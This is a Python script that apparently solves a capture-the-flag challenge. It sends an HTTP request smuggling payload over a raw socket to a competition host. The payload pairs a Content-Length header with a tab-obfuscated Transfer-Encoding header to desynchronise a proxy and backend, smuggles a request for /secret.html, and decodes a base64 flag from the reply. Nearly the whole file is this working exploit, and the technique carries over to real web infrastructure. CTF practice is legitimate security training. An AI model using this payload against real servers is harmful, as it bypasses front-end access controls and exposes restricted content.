import socket
import re
import base64

# --- Configuration ---
PROXY_HOST = "ctf.compfest.id" 
PROXY_PORT = 7304
# ---------------------

def solve():
    """
    Retries the single-shot smuggling payload that previously caused a timeout.
    This is the most likely vector for success.
    """
    
    # Using a simple HTTP/1.0 request for the smuggled part is most robust.
    smuggled_request = (
        b"GET /secret.html HTTP/1.0\r\n"
        b"\r\n"
    )

    # The backend will see Transfer-Encoding and stop reading at the 0-chunk.
    # The smuggled_request is left in the TCP buffer for pipelining.
    body = b"0\r\n\r\n" + smuggled_request

    # This payload caused a timeout once, which is a sign of a successful desync.
    # The theory is that some servers in the pool are vulnerable to this while
    # others are not, leading to inconsistent results.
    payload = (
        b"POST /index.html HTTP/1.1\r\n"
        b"Host: " + PROXY_HOST.encode() + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Transfer-Encoding\t: chunked\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    ) + body

    full_response = b""
    try:
        # Increased timeout to 15 seconds to be safe.
        with socket.create_connection((PROXY_HOST, PROXY_PORT), timeout=15) as s:
            print("[+] Sending the timeout-inducing payload... (Attempting again)")
            s.sendall(payload)
            s.shutdown(socket.SHUT_WR) 

            print("[+] Reading response...")
            while True:
                data = s.recv(4096)
                if not data:
                    break
                full_response += data
    
    except Exception as e:
        print(f"[!] An error occurred: {e}")
        print("[!] This might be the expected timeout! If so, the server is likely vulnerable.")
        print("[!] Try running the script again several times.")
        return

    response_text = full_response.decode('utf-8', errors='ignore')
    
    if not response_text:
        print("[!] Received no response from the server.")
        return
        
    print("\n--- FULL RESPONSE RECEIVED ---")
    print(response_text)
    print("----------------------------\n")

    match = re.search(r'Here is your flag: ([A-Za-z0-9+/=]+)', response_text)

    if match:
        b64_flag = match.group(1)
        print(f"[*] Found Base64 Flag: {b64_flag}")
        decoded_flag = base64.b64decode(b64_flag).decode('utf-8')
        print(f"\n🏁 FLAG: {decoded_flag}")
    else:
        print("[!] Could not find the flag. Please try running the script again.")

if __name__ == "__main__":
    solve()